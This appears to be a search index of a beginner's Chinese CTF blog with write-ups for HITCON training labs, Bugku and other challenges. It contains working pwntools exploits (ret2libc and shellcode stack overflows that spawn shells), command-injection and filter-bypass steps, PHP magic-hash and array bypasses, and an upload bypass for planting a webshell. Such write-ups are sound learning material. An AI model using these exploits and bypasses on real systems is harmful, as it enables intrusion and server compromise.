<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hitcon lab1</title>
    <url>/2019/04/17/Hitcon-lab1/</url>
    <content><![CDATA[<p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
<pre><code>Hitcon这个是le3ding大佬推给我的


这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git


——————————分割线——————————

lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法

用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag

将if(password == magic)改为if(password ！= magic)

运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>Hitcon_lab4</title>
    <url>/2019/04/24/Hitcon-lab4/</url>
    <content><![CDATA[<p>lab4是一道 return to libc 的题，</p>
<pre><code>首先checksec一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc067abaa659.png" alt></p>
<pre><code>可以看到没有开栈保护，开了NX了，可以栈溢出

file 一下 ret2lib ，返回32位

用ida打开文件分析一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc068d80b6c5.png" alt></p>
<pre><code>这里两个地方值得注意：
    1、see_something()这个函数可以将你输入的地址找到其在运行中的真实地址

    2、像read，puts这样简单的函数可以被用来寻找偏移量

通过这两点可以用see_something()这个函数，将puts函数的真实地址返回出来

接下来就是找到libc的真实地址，计算偏移量，然后计算出system的真实地址，最后是计算出&quot;bin/sh&quot;真实地址拿到shell

exp：

#-*-coding:utf8-*-
from pwn import *

io = process(&quot;./ret2lib&quot;)
elf = ELF(&quot;./ret2lib&quot;)

libc = ELF(&quot;/lib32/libc.so.6&quot;)

puts_libc = libc.symbols[&quot;puts&quot;]
print &quot;puts_libc&quot; + hex(puts_libc) 

system_libc = libc.symbols[&quot;system&quot;]

binsh_libc = libc.search(&apos;/bin/sh&apos;).next()
print &quot;binsh_libc&quot; + hex(binsh_libc)

puts_plt = elf.plt[&quot;puts&quot;]
print &quot;puts_plt:&quot; + hex(puts_plt)

puts_got = elf.got[&quot;puts&quot;]
print &quot;puts_got:&quot; + hex(puts_got)

io.recvuntil(&quot;:&quot;)
io.sendline(str(puts_got))

io.recvuntil(&apos;0x&apos;)
puts_addr = int(io.reuntil(&apos;\n&apos;),16)
print &quot;puts_addr:&quot; + hex(puts_addr) //获得puts地址

main = 0x0804857d  //通过ida找出mian的地址

offset = puts_addr - puts_libc  //计算偏移量
system_addr = system_libc + offset  //system地址
binsh =  binsh_libc + offset  // bin/sh地址

io.recvuntil(&quot;:&quot;)
payload = &apos;a&apos; * 60
payload += p32(system_addr) + p32(main) + p32(binsh)


io.sendline(payload)
io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3cdfb2d.png" alt></p>
<pre><code>拿到shell</code></pre>]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcon  lab3 </title>
    <url>/2019/04/18/hitcon-lab3/</url>
    <content><![CDATA[<p>lab3这道题是一个基本的栈溢出</p>
<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，

由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路

首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
<pre><code>地址为0x0804A060

直接上exp：

from pwn import *

&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;

context.log_level = &apos;debug&apos;

io = process(&apos;ret2sc&apos;)

sc = asm(shellcraft.sh())

ret2 = &apos;A&apos;*32 + p32(0x0804A060)

io.sendafter(&apos;Name:&apos;,sc)

io.sendafter(&apos;best:&apos;,ret2)

io.interactive()

直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
<pre><code>ok，拿到shell，直接cat flag就行了</code></pre>]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>calc2</title>
    <url>/2019/04/19/calc2/</url>
    <content><![CDATA[<p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面

接着打算直接cat flag，然而并不行

if(!empty($_GET)){
$str=$_GET[&quot;calc&quot;];
if(strpos($str,&quot;#&quot;)!==false)
    die;
if(strpos($str,&quot;`&quot;)!==false)
    die;
if(strpos($str,&quot;flag&quot;)!==false)
    die;

成了,flag被过滤了

嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
<pre><code>拿到flag</code></pre>]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql函数用法</title>
    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<ol>
<li>count()：汇总数据函数</li>
<li>rand()：随机输出一个小于1的正数</li>
<li>floor()：把输出的结果取整</li>
<li>group by语句：把结果分组输出</li>
<li>concat()：连接两条语句</li>
</ol>
]]></content>
      <categories>
        <category>-数据库学习</category>
      </categories>
      <tags>
        <tag>-Mysql -函数用法</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 备份文件 wirteup</title>
    <url>/2018/11/26/bugku%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6wirteup/</url>
    <content><![CDATA[<p>备份文件一般情况是在后缀名后加的<em>.swp，</em>.bak</p>
<p>利用==比较漏洞</p>
<p>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</p>
<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>下列的字符串的MD5值都是0e开头的：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>s214587387a</p>
]]></content>
      <categories>
        <category>-CTF学习</category>
      </categories>
      <tags>
        <tag>-Web -ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 构造函数 wirteup</title>
    <url>/2018/11/28/bugku%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0wirteup/</url>
    <content><![CDATA[<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);

    else

        print 'sorry!';

}
?>

<p> if (sha1($_GET[‘uname’]) === sha1($_POST[‘passwd’])</p>
<p>构造数组  ?id=margin&amp;uname[ ]=1</p>
]]></content>
      <categories>
        <category>-CTF学习</category>
      </categories>
      <tags>
        <tag>-Web -ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 文件上传 wirteup</title>
    <url>/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/</url>
    <content><![CDATA[<p><img src="images/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
<p>这道题是后缀名黑名单检测和类型检测<br>        1. 把请求头里面的Content-Type字母改成大写进行绕过<br>        2. .jpg后面加上.php5其他的都被过滤了好像<br> 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag</p>
<p>要修改三个地方：<br>1、扩展名filename<br>2、filename下面一行的Content-Type:image/jpeg<br>3、最最最重要的是请求头里的Content-Type字段，进行大小写绕过，也就是把multipart/form-data中任意一个字母改成大写即可<br><img src="images/c2zulbcl.bmp" alt></p>
]]></content>
      <categories>
        <category>-CTF学习</category>
      </categories>
      <tags>
        <tag>-Web -ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf web easy calc wirteup</title>
    <url>/2020/07/25/buuctf-web-easy-calc-wirteup/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>i春秋 file_get_contents wirteup</title>
    <url>/2020/07/25/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>i春秋 sql绕过 wirteup</title>
    <url>/2020/07/25/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>i春秋 sqli wirteup</title>
    <url>/2020/07/25/i%E6%98%A5%E7%A7%8B-sqli-wirteup/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>i春秋模拟上传wirteup</title>
    <url>/2020/07/25/i%E6%98%A5%E7%A7%8B%E6%A8%A1%E6%8B%9F%E4%B8%8A%E4%BC%A0wirteup/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>php函数学习</title>
    <url>/2020/07/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>python学习笔记</title>
    <url>/2020/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>过狗一句话小技巧</title>
    <url>/2020/07/25/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
